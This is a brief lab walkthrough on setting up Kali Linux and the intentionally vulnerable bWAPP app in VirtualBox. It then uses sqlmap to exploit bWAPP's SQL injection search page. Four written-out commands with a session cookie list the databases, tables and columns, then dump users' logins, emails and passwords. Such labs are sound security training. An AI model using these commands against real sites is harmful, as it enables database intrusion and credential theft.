# Kali + bWAPP

1. install Kali and bWAPP vm in virtual box;

   ![](/assets/virtualbox-2-vm)

2. launch bWAP and make sure it is running;

   ![](/assets/bWAPP-from-vm)

3. Launch Kali and make sure you can access the bWAPP from Iceweasel.

![](/assets/acces-bWAPP-from-kali)

  4. Go to SQL Injection \(GET/Search\)

![](/assets/sql-get)



  5. key in a search string; copy of the resulted URL;![](/assets/search-box)

  6. Find out the cookie for the site;

![](/assets/get-cookie-pref)

![](/assets/get-cookie-id)



**Now, it is show time; launch SQLmap from terminal;**



**step1 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" --dbs

![](/assets/s1)

**step2 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D _**bWAPP **_--tables

![](/assets/s2)

**step3 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D _**bWAPP **_-T _**users **_--columns

![](/assets/s3)

**step4 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --

cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D bWAPP -T users -C** login,email,password** --dump

![](/assets/s4)

